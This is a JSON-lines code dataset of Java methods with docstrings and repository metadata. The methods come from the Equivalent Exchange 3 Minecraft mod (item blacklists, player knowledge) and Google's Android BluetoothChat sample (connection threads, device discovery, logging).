{"docstring": "/**\n * TODO Finish JavaDoc\n *\n * @param object\n * @return\n */\n", "func_signal": "public boolean isLearnable(Object object)", "code": "{\n\n    if (WrappedStack.canBeWrapped(object)) {\n\n        WrappedStack wrappedObject = WrappedStack.build(object, 1);\n\n        if (object instanceof ItemStack && ((ItemStack) object).isItemDamaged()) {\n            return false;\n        }\n        else {\n            if (EnergyValueRegistryProxy.hasEnergyValue(wrappedObject)) {\n\n                if (knowledgeBlacklist.contains(wrappedObject)) {\n                    return false;\n                }\n                else if (object instanceof ItemStack){\n                    Collection<String> oreNames = OreDictionaryHelper.getOreNames((ItemStack) object);\n                    for (String oreName : oreNames) {\n                        if (knowledgeBlacklist.contains(WrappedStack.build(new OreStack(oreName)))) {\n                            return false;\n                        }\n                    }\n                }\n\n                return true;\n            }\n        }\n    }\n\n    return false;\n}", "path": "src\\main\\java\\com\\pahimar\\ee\\blacklist\\BlacklistRegistry.java", "repo_name": "pahimar/Equivalent-Exchange-3", "stars": 700, "license": "lgpl-3.0", "language": "java", "size": 10802}
{"docstring": "/**\n * TODO Finish JavaDoc\n *\n * @param objects\n */\n", "func_signal": "public void forget(Collection<?> objects)", "code": "{\n\n    if (objects != null) {\n        objects.forEach(this::forget);\n    }\n}", "path": "src\\main\\java\\com\\pahimar\\ee\\knowledge\\PlayerKnowledge.java", "repo_name": "pahimar/Equivalent-Exchange-3", "stars": 700, "license": "lgpl-3.0", "language": "java", "size": 10802}
{"docstring": "/**\n * TODO Finish JavaDoc\n *\n * @param blacklistSet\n * @param blacklist\n */\n", "func_signal": "public void load(Set<WrappedStack> blacklistSet, Blacklist blacklist)", "code": "{\n\n    if (blacklist != null && blacklistSet != null) {\n\n        setShouldSave(false);\n\n        if (blacklist == Blacklist.KNOWLEDGE) {\n            LogHelper.info(\"Received {} player knowledge blacklist entries from server\", blacklistSet.size());\n            knowledgeBlacklist.clear();\n            knowledgeBlacklist.addAll(blacklistSet.stream().filter(wrappedStack -> wrappedStack != null).collect(Collectors.toList()));\n        }\n        else if (blacklist == Blacklist.EXCHANGE) {\n            LogHelper.info(\"Received {} exchange blacklist entries from server\", blacklistSet.size());\n            exchangeBlacklist.clear();\n            exchangeBlacklist.addAll(blacklistSet.stream().filter(wrappedStack -> wrappedStack != null).collect(Collectors.toList()));\n        }\n    }\n}", "path": "src\\main\\java\\com\\pahimar\\ee\\blacklist\\BlacklistRegistry.java", "repo_name": "pahimar/Equivalent-Exchange-3", "stars": 700, "license": "lgpl-3.0", "language": "java", "size": 10802}
{"docstring": "/**\n * TODO Finish JavaDoc\n *\n * @param recipeOutput\n * @param recipeInputs\n */\n", "func_signal": "public static void addRecipe(Object recipeOutput, Collection<?> recipeInputs)", "code": "{\n\n    init();\n\n    if (mod != null) {\n        ModWrapper.mod.getRecipeRegistry().addRecipe(recipeOutput, recipeInputs);\n    }\n}", "path": "src\\main\\java\\com\\pahimar\\ee\\api\\recipe\\RecipeRegistryProxy.java", "repo_name": "pahimar/Equivalent-Exchange-3", "stars": 700, "license": "lgpl-3.0", "language": "java", "size": 10802}
{"docstring": "/**\n * TODO Finish JavaDoc\n *\n * @param object\n * @param blacklist\n */\n", "func_signal": "public void addToBlacklist(Object object, Blacklist blacklist)", "code": "{\n\n    if (WrappedStack.canBeWrapped(object)) {\n\n        WrappedStack wrappedStack = WrappedStack.build(object, 1);\n\n        if (blacklist == Blacklist.KNOWLEDGE) {\n            if (wrappedStack != null && !MinecraftForge.EVENT_BUS.post(new KnowledgeBlacklistEvent(object))) {\n                LogHelper.trace(KNOWLEDGE_BLACKLIST_MARKER, \"[{}] Mod with ID '{}' added object {} to the player knowledge blacklist\", Loader.instance().getLoaderState(), Loader.instance().activeModContainer().getModId(), wrappedStack);\n                knowledgeBlacklist.add(WrappedStack.build(object, 1));\n                save(blacklist);\n            }\n        }\n        else if (blacklist == Blacklist.EXCHANGE) {\n            if (wrappedStack != null && !MinecraftForge.EVENT_BUS.post(new ExchangeBlacklistEvent(object))) {\n                LogHelper.trace(EXCHANGE_BLACKLIST_MARKER, \"[{}] Mod with ID '{}' added object {} to the exchange blacklist\", Loader.instance().getLoaderState(), Loader.instance().activeModContainer().getModId(), wrappedStack);\n                exchangeBlacklist.add(WrappedStack.build(object, 1));\n                save(blacklist);\n            }\n        }\n    }\n}", "path": "src\\main\\java\\com\\pahimar\\ee\\blacklist\\BlacklistRegistry.java", "repo_name": "pahimar/Equivalent-Exchange-3", "stars": 700, "license": "lgpl-3.0", "language": "java", "size": 10802}
{"docstring": "/**\n * TODO Finish JavaDoc\n *\n * @param itemStack\n * @return\n */\n", "func_signal": "public static ItemStack getCalcinationResult(ItemStack itemStack)", "code": "{\n\n    if (itemStack != null) {\n\n        // TODO Uncomment after reimplemented\n//            EnergyValue dustValue = EnergyValueRegistryProxy.getEnergyValue(new ItemStack(ModItems.alchemicalDust, 1, 3));\n//            EnergyValue itemStackValue = EnergyValueRegistryProxy.getEnergyValue(itemStack);\n//\n//            if (dustValue != null && itemStackValue != null) {\n//\n//                int dustAmount = (int) Math.floor(itemStackValue.getValue() / dustValue.getValue());\n//                float residualEMC = itemStackValue.getValue() - (dustAmount * dustValue.getValue());\n//\n//                double u = (double) residualEMC / dustValue.getValue(); // expected value (\u00b5)\n//                double s = u / 2; // deviation (\u03c3)\n//                u *= 1 - 0.0043451773677092; // negative cut-off correction factor\n//                dustAmount += (int) (Math.max(0, RANDOM.nextGaussian() * s + u) + RANDOM.nextDouble());\n//\n//                if (dustAmount > 0) {\n//                    return new ItemStack(ModItems.alchemicalDust, dustAmount, 3);\n//                }\n//            }\n//\n//            return new ItemStack(ModItems.alchemicalDust, 1, 0);\n    }\n\n    return null;\n}", "path": "src\\main\\java\\com\\pahimar\\ee\\util\\CalcinationUtils.java", "repo_name": "pahimar/Equivalent-Exchange-3", "stars": 700, "license": "lgpl-3.0", "language": "java", "size": 10802}
{"docstring": "/**\n * TODO Finish JavaDoc\n *\n * @param entity\n * @return\n */\n", "func_signal": "public static NBTTagCompound getCustomEntityData(Entity entity)", "code": "{\n\n    if (entity != null && entity.getEntityData().hasKey(EquivalentExchange.MOD_ID) && entity.getEntityData().getTag(EquivalentExchange.MOD_ID) instanceof NBTTagCompound) {\n        return entity.getEntityData().getCompoundTag(EquivalentExchange.MOD_ID);\n    }\n\n    return new NBTTagCompound();\n}", "path": "src\\main\\java\\com\\pahimar\\ee\\util\\EntityUtils.java", "repo_name": "pahimar/Equivalent-Exchange-3", "stars": 700, "license": "lgpl-3.0", "language": "java", "size": 10802}
{"docstring": "/**\n * Updates the references to the instance specific EE data directories, creating them if they don't already exist\n */\n", "func_signal": "public static void updateFileReferences()", "code": "{\n\n    playerDataDirectory = new File(FMLCommonHandler.instance().getMinecraftServerInstance().getEntityWorld().getSaveHandler().getWorldDirectory(), \"playerdata\" + File.separator + EquivalentExchange.MOD_ID);\n    playerDataDirectory.mkdirs();\n}", "path": "src\\main\\java\\com\\pahimar\\ee\\reference\\Files.java", "repo_name": "pahimar/Equivalent-Exchange-3", "stars": 700, "license": "lgpl-3.0", "language": "java", "size": 10802}
{"docstring": "/**\n * TODO Finish JavaDoc\n *\n * @param object\n */\n", "func_signal": "public void learn(Object object)", "code": "{\n\n    if (object instanceof ItemStack) {\n        ItemStack unitItemStack = ItemStackUtils.clone((ItemStack) object, 1);\n        knownItemStacks.add(unitItemStack);\n    }\n}", "path": "src\\main\\java\\com\\pahimar\\ee\\knowledge\\PlayerKnowledge.java", "repo_name": "pahimar/Equivalent-Exchange-3", "stars": 700, "license": "lgpl-3.0", "language": "java", "size": 10802}
{"docstring": "/**\n * TODO Finish JavaDoc\n *\n * @param objects\n */\n", "func_signal": "public PlayerKnowledge(Collection<?> objects)", "code": "{\n\n    knownItemStacks = new TreeSet<>(Comparators.ID_COMPARATOR);\n\n    if (objects != null) {\n        objects.forEach(this::learn);\n    }\n}", "path": "src\\main\\java\\com\\pahimar\\ee\\knowledge\\PlayerKnowledge.java", "repo_name": "pahimar/Equivalent-Exchange-3", "stars": 700, "license": "lgpl-3.0", "language": "java", "size": 10802}
{"docstring": "/**\n * TODO Finish JavaDoc\n *\n * @param object\n * @return\n */\n", "func_signal": "public boolean isExchangeable(Object object)", "code": "{\n\n    if (WrappedStack.canBeWrapped(object)) {\n\n        WrappedStack wrappedObject = WrappedStack.build(object, 1);\n\n        if (EnergyValueRegistryProxy.hasEnergyValue(wrappedObject)) {\n\n            if (exchangeBlacklist.contains(wrappedObject)) {\n                return false;\n            }\n            else if (object instanceof ItemStack){\n                Collection<String> oreNames = OreDictionaryHelper.getOreNames((ItemStack) object);\n                for (String oreName : oreNames) {\n                    if (exchangeBlacklist.contains(WrappedStack.build(new OreStack(oreName)))) {\n                        return false;\n                    }\n                }\n            }\n\n            return true;\n        }\n    }\n\n    return false;\n}", "path": "src\\main\\java\\com\\pahimar\\ee\\blacklist\\BlacklistRegistry.java", "repo_name": "pahimar/Equivalent-Exchange-3", "stars": 700, "license": "lgpl-3.0", "language": "java", "size": 10802}
{"docstring": "/**\n * TODO Finish JavaDoc\n *\n * @param blacklist\n */\n", "func_signal": "public void save(Blacklist blacklist)", "code": "{\n\n    if (shouldSave) {\n        if (blacklist == Blacklist.KNOWLEDGE && knowledgeBlacklistFile != null) {\n            SerializationHelper.writeJsonFile(knowledgeBlacklistFile, SerializationHelper.GSON.toJson(knowledgeBlacklist));\n        }\n        else if (blacklist == Blacklist.EXCHANGE && exchangeBlacklistFile != null) {\n            SerializationHelper.writeJsonFile(exchangeBlacklistFile, SerializationHelper.GSON.toJson(exchangeBlacklist));\n        }\n    }\n}", "path": "src\\main\\java\\com\\pahimar\\ee\\blacklist\\BlacklistRegistry.java", "repo_name": "pahimar/Equivalent-Exchange-3", "stars": 700, "license": "lgpl-3.0", "language": "java", "size": 10802}
{"docstring": "/**\n * TODO Finish JavaDoc\n *\n * @param object\n * @param blacklist\n */\n", "func_signal": "public void removeFromBlacklist(Object object, Blacklist blacklist)", "code": "{\n\n    if (WrappedStack.canBeWrapped(object)) {\n\n        WrappedStack wrappedStack = WrappedStack.build(object, 1);\n\n        if (blacklist == Blacklist.KNOWLEDGE) {\n            if (wrappedStack != null && !MinecraftForge.EVENT_BUS.post(new KnowledgeWhitelistEvent(object))) {\n                LogHelper.trace(KNOWLEDGE_WHITELIST_MARKER, \"[{}] Mod with ID '{}' removed object {} from the player knowledge blacklist\", Loader.instance().getLoaderState(), Loader.instance().activeModContainer().getModId(), wrappedStack);\n                knowledgeBlacklist.remove(wrappedStack);\n                save(blacklist);\n            }\n        }\n        else if (blacklist == Blacklist.EXCHANGE) {\n            if (wrappedStack != null && !MinecraftForge.EVENT_BUS.post(new ExchangeWhitelistEvent(object))) {\n                LogHelper.trace(EXCHANGE_WHITELIST_MARKER, \"[{}] Mod with ID '{}' removed object {} from the exchange blacklist\", Loader.instance().getLoaderState(), Loader.instance().activeModContainer().getModId(), wrappedStack);\n                exchangeBlacklist.remove(wrappedStack);\n                save(blacklist);\n            }\n        }\n    }\n}", "path": "src\\main\\java\\com\\pahimar\\ee\\blacklist\\BlacklistRegistry.java", "repo_name": "pahimar/Equivalent-Exchange-3", "stars": 700, "license": "lgpl-3.0", "language": "java", "size": 10802}
{"docstring": "/**\n * TODO Finish JavaDoc\n *\n * @param objects\n */\n", "func_signal": "public void learn(Collection<?> objects)", "code": "{\n\n    if (objects != null) {\n        objects.forEach(this::learn);\n    }\n}", "path": "src\\main\\java\\com\\pahimar\\ee\\knowledge\\PlayerKnowledge.java", "repo_name": "pahimar/Equivalent-Exchange-3", "stars": 700, "license": "lgpl-3.0", "language": "java", "size": 10802}
{"docstring": "/**\n * TODO Finish JavaDoc\n */\n", "func_signal": "private BlacklistRegistry()", "code": "{\n\n    knowledgeBlacklist = new TreeSet<>();\n    exchangeBlacklist = new TreeSet<>();\n    shouldSave = true;\n}", "path": "src\\main\\java\\com\\pahimar\\ee\\blacklist\\BlacklistRegistry.java", "repo_name": "pahimar/Equivalent-Exchange-3", "stars": 700, "license": "lgpl-3.0", "language": "java", "size": 10802}
{"docstring": "/**\n * TODO Finish JavaDoc\n *\n * @param fluidStack\n * @return\n */\n", "func_signal": "public static String toString(FluidStack fluidStack)", "code": "{\n\n    if (fluidStack != null) {\n        return String.format(\"%sxfluidStack.%s\", fluidStack.amount, fluidStack.getFluid().getName());\n    }\n\n    return \"fluidStack[null]\";\n}", "path": "src\\main\\java\\com\\pahimar\\ee\\util\\FluidStackUtils.java", "repo_name": "pahimar/Equivalent-Exchange-3", "stars": 700, "license": "lgpl-3.0", "language": "java", "size": 10802}
{"docstring": "/**\n * Updates the status on the action bar.\n *\n * @param subTitle status\n */\n", "func_signal": "private void setStatus(CharSequence subTitle)", "code": "{\n    FragmentActivity activity = getActivity();\n    if (null == activity) {\n        return;\n    }\n    final ActionBar actionBar = activity.getActionBar();\n    if (null == actionBar) {\n        return;\n    }\n    actionBar.setSubtitle(subTitle);\n}", "path": "Application\\src\\main\\java\\com\\example\\android\\bluetoothchat\\BluetoothChatFragment.java", "repo_name": "googlearchive/android-BluetoothChat", "stars": 984, "license": "apache-2.0", "language": "java", "size": 571}
{"docstring": "/**\n * Start the chat service. Specifically start AcceptThread to begin a\n * session in listening (server) mode. Called by the Activity onResume()\n */\n", "func_signal": "public synchronized void start()", "code": "{\n    Log.d(TAG, \"start\");\n\n    // Cancel any thread attempting to make a connection\n    if (mConnectThread != null) {\n        mConnectThread.cancel();\n        mConnectThread = null;\n    }\n\n    // Cancel any thread currently running a connection\n    if (mConnectedThread != null) {\n        mConnectedThread.cancel();\n        mConnectedThread = null;\n    }\n\n    // Start the thread to listen on a BluetoothServerSocket\n    if (mSecureAcceptThread == null) {\n        mSecureAcceptThread = new AcceptThread(true);\n        mSecureAcceptThread.start();\n    }\n    if (mInsecureAcceptThread == null) {\n        mInsecureAcceptThread = new AcceptThread(false);\n        mInsecureAcceptThread.start();\n    }\n    // Update UI title\n    updateUserInterfaceTitle();\n}", "path": "Application\\src\\main\\java\\com\\example\\android\\bluetoothchat\\BluetoothChatService.java", "repo_name": "googlearchive/android-BluetoothChat", "stars": 984, "license": "apache-2.0", "language": "java", "size": 571}
{"docstring": "/**\n * Set up the UI and background operations for chat.\n */\n", "func_signal": "private void setupChat()", "code": "{\n    Log.d(TAG, \"setupChat()\");\n\n    // Initialize the array adapter for the conversation thread\n    mConversationArrayAdapter = new ArrayAdapter<String>(getActivity(), R.layout.message);\n\n    mConversationView.setAdapter(mConversationArrayAdapter);\n\n    // Initialize the compose field with a listener for the return key\n    mOutEditText.setOnEditorActionListener(mWriteListener);\n\n    // Initialize the send button with a listener that for click events\n    mSendButton.setOnClickListener(new View.OnClickListener() {\n        public void onClick(View v) {\n            // Send a message using content of the edit text widget\n            View view = getView();\n            if (null != view) {\n                TextView textView = (TextView) view.findViewById(R.id.edit_text_out);\n                String message = textView.getText().toString();\n                sendMessage(message);\n            }\n        }\n    });\n\n    // Initialize the BluetoothChatService to perform bluetooth connections\n    mChatService = new BluetoothChatService(getActivity(), mHandler);\n\n    // Initialize the buffer for outgoing messages\n    mOutStringBuffer = new StringBuffer(\"\");\n}", "path": "Application\\src\\main\\java\\com\\example\\android\\bluetoothchat\\BluetoothChatFragment.java", "repo_name": "googlearchive/android-BluetoothChat", "stars": 984, "license": "apache-2.0", "language": "java", "size": 571}
{"docstring": "/**\n * Start the ConnectedThread to begin managing a Bluetooth connection\n *\n * @param socket The BluetoothSocket on which the connection was made\n * @param device The BluetoothDevice that has been connected\n */\n", "func_signal": "public synchronized void connected(BluetoothSocket socket, BluetoothDevice\n        device, final String socketType)", "code": "{\n    Log.d(TAG, \"connected, Socket Type:\" + socketType);\n\n    // Cancel the thread that completed the connection\n    if (mConnectThread != null) {\n        mConnectThread.cancel();\n        mConnectThread = null;\n    }\n\n    // Cancel any thread currently running a connection\n    if (mConnectedThread != null) {\n        mConnectedThread.cancel();\n        mConnectedThread = null;\n    }\n\n    // Cancel the accept thread because we only want to connect to one device\n    if (mSecureAcceptThread != null) {\n        mSecureAcceptThread.cancel();\n        mSecureAcceptThread = null;\n    }\n    if (mInsecureAcceptThread != null) {\n        mInsecureAcceptThread.cancel();\n        mInsecureAcceptThread = null;\n    }\n\n    // Start the thread to manage the connection and perform transmissions\n    mConnectedThread = new ConnectedThread(socket, socketType);\n    mConnectedThread.start();\n\n    // Send the name of the connected device back to the UI Activity\n    Message msg = mHandler.obtainMessage(Constants.MESSAGE_DEVICE_NAME);\n    Bundle bundle = new Bundle();\n    bundle.putString(Constants.DEVICE_NAME, device.getName());\n    msg.setData(bundle);\n    mHandler.sendMessage(msg);\n    // Update UI title\n    updateUserInterfaceTitle();\n}", "path": "Application\\src\\main\\java\\com\\example\\android\\bluetoothchat\\BluetoothChatService.java", "repo_name": "googlearchive/android-BluetoothChat", "stars": 984, "license": "apache-2.0", "language": "java", "size": 571}
{"docstring": "/**\n * Start device discover with the BluetoothAdapter\n */\n", "func_signal": "private void doDiscovery()", "code": "{\n    Log.d(TAG, \"doDiscovery()\");\n\n    // Indicate scanning in the title\n    setProgressBarIndeterminateVisibility(true);\n    setTitle(R.string.scanning);\n\n    // Turn on sub-title for new devices\n    findViewById(R.id.title_new_devices).setVisibility(View.VISIBLE);\n\n    // If we're already discovering, stop it\n    if (mBtAdapter.isDiscovering()) {\n        mBtAdapter.cancelDiscovery();\n    }\n\n    // Request discover from BluetoothAdapter\n    mBtAdapter.startDiscovery();\n}", "path": "Application\\src\\main\\java\\com\\example\\android\\bluetoothchat\\DeviceListActivity.java", "repo_name": "googlearchive/android-BluetoothChat", "stars": 984, "license": "apache-2.0", "language": "java", "size": 571}
{"docstring": "/**\n * Establish connection with other device\n *\n * @param data   An {@link Intent} with {@link DeviceListActivity#EXTRA_DEVICE_ADDRESS} extra.\n * @param secure Socket Security type - Secure (true) , Insecure (false)\n */\n", "func_signal": "private void connectDevice(Intent data, boolean secure)", "code": "{\n    // Get the device MAC address\n    String address = data.getExtras()\n            .getString(DeviceListActivity.EXTRA_DEVICE_ADDRESS);\n    // Get the BluetoothDevice object\n    BluetoothDevice device = mBluetoothAdapter.getRemoteDevice(address);\n    // Attempt to connect to the device\n    mChatService.connect(device, secure);\n}", "path": "Application\\src\\main\\java\\com\\example\\android\\bluetoothchat\\BluetoothChatFragment.java", "repo_name": "googlearchive/android-BluetoothChat", "stars": 984, "license": "apache-2.0", "language": "java", "size": 571}
{"docstring": "/**\n * Indicate that the connection was lost and notify the UI Activity.\n */\n", "func_signal": "private void connectionLost()", "code": "{\n    // Send a failure message back to the Activity\n    Message msg = mHandler.obtainMessage(Constants.MESSAGE_TOAST);\n    Bundle bundle = new Bundle();\n    bundle.putString(Constants.TOAST, \"Device connection was lost\");\n    msg.setData(bundle);\n    mHandler.sendMessage(msg);\n\n    mState = STATE_NONE;\n    // Update UI title\n    updateUserInterfaceTitle();\n\n    // Start the service over to restart listening mode\n    BluetoothChatService.this.start();\n}", "path": "Application\\src\\main\\java\\com\\example\\android\\bluetoothchat\\BluetoothChatService.java", "repo_name": "googlearchive/android-BluetoothChat", "stars": 984, "license": "apache-2.0", "language": "java", "size": 571}
{"docstring": "/**\n * Update UI title according to the current state of the chat connection\n */\n", "func_signal": "private synchronized void updateUserInterfaceTitle()", "code": "{\n    mState = getState();\n    Log.d(TAG, \"updateUserInterfaceTitle() \" + mNewState + \" -> \" + mState);\n    mNewState = mState;\n\n    // Give the new state to the Handler so the UI Activity can update\n    mHandler.obtainMessage(Constants.MESSAGE_STATE_CHANGE, mNewState, -1).sendToTarget();\n}", "path": "Application\\src\\main\\java\\com\\example\\android\\bluetoothchat\\BluetoothChatService.java", "repo_name": "googlearchive/android-BluetoothChat", "stars": 984, "license": "apache-2.0", "language": "java", "size": 571}
{"docstring": "/**\n * Updates the status on the action bar.\n *\n * @param resId a string resource ID\n */\n", "func_signal": "private void setStatus(int resId)", "code": "{\n    FragmentActivity activity = getActivity();\n    if (null == activity) {\n        return;\n    }\n    final ActionBar actionBar = activity.getActionBar();\n    if (null == actionBar) {\n        return;\n    }\n    actionBar.setSubtitle(resId);\n}", "path": "Application\\src\\main\\java\\com\\example\\android\\bluetoothchat\\BluetoothChatFragment.java", "repo_name": "googlearchive/android-BluetoothChat", "stars": 984, "license": "apache-2.0", "language": "java", "size": 571}
{"docstring": "/**\n * Sends a message.\n *\n * @param message A string of text to send.\n */\n", "func_signal": "private void sendMessage(String message)", "code": "{\n    // Check that we're actually connected before trying anything\n    if (mChatService.getState() != BluetoothChatService.STATE_CONNECTED) {\n        Toast.makeText(getActivity(), R.string.not_connected, Toast.LENGTH_SHORT).show();\n        return;\n    }\n\n    // Check that there's actually something to send\n    if (message.length() > 0) {\n        // Get the message bytes and tell the BluetoothChatService to write\n        byte[] send = message.getBytes();\n        mChatService.write(send);\n\n        // Reset out string buffer to zero and clear the edit text field\n        mOutStringBuffer.setLength(0);\n        mOutEditText.setText(mOutStringBuffer);\n    }\n}", "path": "Application\\src\\main\\java\\com\\example\\android\\bluetoothchat\\BluetoothChatFragment.java", "repo_name": "googlearchive/android-BluetoothChat", "stars": 984, "license": "apache-2.0", "language": "java", "size": 571}
{"docstring": "/**\n * Write to the connected OutStream.\n *\n * @param buffer The bytes to write\n */\n", "func_signal": "public void write(byte[] buffer)", "code": "{\n    try {\n        mmOutStream.write(buffer);\n\n        // Share the sent message back to the UI Activity\n        mHandler.obtainMessage(Constants.MESSAGE_WRITE, -1, -1, buffer)\n                .sendToTarget();\n    } catch (IOException e) {\n        Log.e(TAG, \"Exception during write\", e);\n    }\n}", "path": "Application\\src\\main\\java\\com\\example\\android\\bluetoothchat\\BluetoothChatService.java", "repo_name": "googlearchive/android-BluetoothChat", "stars": 984, "license": "apache-2.0", "language": "java", "size": 571}
{"docstring": "/**\n * Makes this device discoverable for 300 seconds (5 minutes).\n */\n", "func_signal": "private void ensureDiscoverable()", "code": "{\n    if (mBluetoothAdapter.getScanMode() !=\n            BluetoothAdapter.SCAN_MODE_CONNECTABLE_DISCOVERABLE) {\n        Intent discoverableIntent = new Intent(BluetoothAdapter.ACTION_REQUEST_DISCOVERABLE);\n        discoverableIntent.putExtra(BluetoothAdapter.EXTRA_DISCOVERABLE_DURATION, 300);\n        startActivity(discoverableIntent);\n    }\n}", "path": "Application\\src\\main\\java\\com\\example\\android\\bluetoothchat\\BluetoothChatFragment.java", "repo_name": "googlearchive/android-BluetoothChat", "stars": 984, "license": "apache-2.0", "language": "java", "size": 571}
{"docstring": "/**\n * Indicate that the connection attempt failed and notify the UI Activity.\n */\n", "func_signal": "private void connectionFailed()", "code": "{\n    // Send a failure message back to the Activity\n    Message msg = mHandler.obtainMessage(Constants.MESSAGE_TOAST);\n    Bundle bundle = new Bundle();\n    bundle.putString(Constants.TOAST, \"Unable to connect device\");\n    msg.setData(bundle);\n    mHandler.sendMessage(msg);\n\n    mState = STATE_NONE;\n    // Update UI title\n    updateUserInterfaceTitle();\n\n    // Start the service over to restart listening mode\n    BluetoothChatService.this.start();\n}", "path": "Application\\src\\main\\java\\com\\example\\android\\bluetoothchat\\BluetoothChatService.java", "repo_name": "googlearchive/android-BluetoothChat", "stars": 984, "license": "apache-2.0", "language": "java", "size": 571}
{"docstring": "/**\n * Write to the ConnectedThread in an unsynchronized manner\n *\n * @param out The bytes to write\n * @see ConnectedThread#write(byte[])\n */\n", "func_signal": "public void write(byte[] out)", "code": "{\n    // Create temporary object\n    ConnectedThread r;\n    // Synchronize a copy of the ConnectedThread\n    synchronized (this) {\n        if (mState != STATE_CONNECTED) return;\n        r = mConnectedThread;\n    }\n    // Perform the write unsynchronized\n    r.write(out);\n}", "path": "Application\\src\\main\\java\\com\\example\\android\\bluetoothchat\\BluetoothChatService.java", "repo_name": "googlearchive/android-BluetoothChat", "stars": 984, "license": "apache-2.0", "language": "java", "size": 571}
{"docstring": "/** Set up targets to receive log data */\n", "func_signal": "public void initializeLogging()", "code": "{\n    // Using Log, front-end to the logging chain, emulates android.util.log method signatures.\n    // Wraps Android's native log framework\n    LogWrapper logWrapper = new LogWrapper();\n    Log.setLogNode(logWrapper);\n\n    Log.i(TAG, \"Ready\");\n}", "path": "Application\\src\\main\\java\\com\\example\\android\\common\\activities\\SampleActivityBase.java", "repo_name": "googlearchive/android-BluetoothChat", "stars": 984, "license": "apache-2.0", "language": "java", "size": 571}
{"docstring": "/**\n * Instructs the LogNode to print the log data provided. Other LogNodes can\n * be chained to the end of the LogNode as desired.\n *\n * @param priority Log level of the data being logged. Verbose, Error, etc.\n * @param tag Tag for for the log data. Can be used to organize log statements.\n * @param msg The actual message to be logged.\n * @param tr If an exception was thrown, this can be sent along for the logging facilities\n *           to extract and print useful information.\n */\n", "func_signal": "public static void println(int priority, String tag, String msg, Throwable tr)", "code": "{\n    if (mLogNode != null) {\n        mLogNode.println(priority, tag, msg, tr);\n    }\n}", "path": "Application\\src\\main\\java\\com\\example\\android\\common\\logger\\Log.java", "repo_name": "googlearchive/android-BluetoothChat", "stars": 984, "license": "apache-2.0", "language": "java", "size": 571}
{"docstring": "/**\n * Constructor. Prepares a new BluetoothChat session.\n *\n * @param context The UI Activity Context\n * @param handler A Handler to send messages back to the UI Activity\n */\n", "func_signal": "public BluetoothChatService(Context context, Handler handler)", "code": "{\n    mAdapter = BluetoothAdapter.getDefaultAdapter();\n    mState = STATE_NONE;\n    mNewState = mState;\n    mHandler = handler;\n}", "path": "Application\\src\\main\\java\\com\\example\\android\\bluetoothchat\\BluetoothChatService.java", "repo_name": "googlearchive/android-BluetoothChat", "stars": 984, "license": "apache-2.0", "language": "java", "size": 571}
{"docstring": "/** Takes a string and adds to it, with a separator, if the bit to be added isn't null. Since\n * the logger takes so many arguments that might be null, this method helps cut out some of the\n * agonizing tedium of writing the same 3 lines over and over.\n * @param source StringBuilder containing the text to append to.\n * @param addStr The String to append\n * @param delimiter The String to separate the source and appended strings. A tab or comma,\n *                  for instance.\n * @return The fully concatenated String as a StringBuilder\n */\n", "func_signal": "private StringBuilder appendIfNotNull(StringBuilder source, String addStr, String delimiter)", "code": "{\n    if (addStr != null) {\n        if (addStr.length() == 0) {\n            delimiter = \"\";\n        }\n\n        return source.append(addStr).append(delimiter);\n    }\n    return source;\n}", "path": "Application\\src\\main\\java\\com\\example\\android\\common\\logger\\LogView.java", "repo_name": "googlearchive/android-BluetoothChat", "stars": 984, "license": "apache-2.0", "language": "java", "size": 571}
{"docstring": "/**\n * Formats the log data and prints it out to the LogView.\n * @param priority Log level of the data being logged.  Verbose, Error, etc.\n * @param tag Tag for for the log data.  Can be used to organize log statements.\n * @param msg The actual message to be logged. The actual message to be logged.\n * @param tr If an exception was thrown, this can be sent along for the logging facilities\n *           to extract and print useful information.\n */\n", "func_signal": "@Override\npublic void println(int priority, String tag, String msg, Throwable tr)", "code": "{\n\n    \n    String priorityStr = null;\n\n    // For the purposes of this View, we want to print the priority as readable text.\n    switch(priority) {\n        case android.util.Log.VERBOSE:\n            priorityStr = \"VERBOSE\";\n            break;\n        case android.util.Log.DEBUG:\n            priorityStr = \"DEBUG\";\n            break;\n        case android.util.Log.INFO:\n            priorityStr = \"INFO\";\n            break;\n        case android.util.Log.WARN:\n            priorityStr = \"WARN\";\n            break;\n        case android.util.Log.ERROR:\n            priorityStr = \"ERROR\";\n            break;\n        case android.util.Log.ASSERT:\n            priorityStr = \"ASSERT\";\n            break;\n        default:\n            break;\n    }\n\n    // Handily, the Log class has a facility for converting a stack trace into a usable string.\n    String exceptionStr = null;\n    if (tr != null) {\n        exceptionStr = android.util.Log.getStackTraceString(tr);\n    }\n\n    // Take the priority, tag, message, and exception, and concatenate as necessary\n    // into one usable line of text.\n    final StringBuilder outputBuilder = new StringBuilder();\n\n    String delimiter = \"\\t\";\n    appendIfNotNull(outputBuilder, priorityStr, delimiter);\n    appendIfNotNull(outputBuilder, tag, delimiter);\n    appendIfNotNull(outputBuilder, msg, delimiter);\n    appendIfNotNull(outputBuilder, exceptionStr, delimiter);\n\n    // In case this was originally called from an AsyncTask or some other off-UI thread,\n    // make sure the update occurs within the UI thread.\n    ((Activity) getContext()).runOnUiThread( (new Thread(new Runnable() {\n        @Override\n        public void run() {\n            // Display the text we just generated within the LogView.\n            appendToLog(outputBuilder.toString());\n        }\n    })));\n\n    if (mNext != null) {\n        mNext.println(priority, tag, msg, tr);\n    }\n}", "path": "Application\\src\\main\\java\\com\\example\\android\\common\\logger\\LogView.java", "repo_name": "googlearchive/android-BluetoothChat", "stars": 984, "license": "apache-2.0", "language": "java", "size": 571}
{"docstring": "/**\n * Stop all threads\n */\n", "func_signal": "public synchronized void stop()", "code": "{\n    Log.d(TAG, \"stop\");\n\n    if (mConnectThread != null) {\n        mConnectThread.cancel();\n        mConnectThread = null;\n    }\n\n    if (mConnectedThread != null) {\n        mConnectedThread.cancel();\n        mConnectedThread = null;\n    }\n\n    if (mSecureAcceptThread != null) {\n        mSecureAcceptThread.cancel();\n        mSecureAcceptThread = null;\n    }\n\n    if (mInsecureAcceptThread != null) {\n        mInsecureAcceptThread.cancel();\n        mInsecureAcceptThread = null;\n    }\n    mState = STATE_NONE;\n    // Update UI title\n    updateUserInterfaceTitle();\n}", "path": "Application\\src\\main\\java\\com\\example\\android\\bluetoothchat\\BluetoothChatService.java", "repo_name": "googlearchive/android-BluetoothChat", "stars": 984, "license": "apache-2.0", "language": "java", "size": 571}
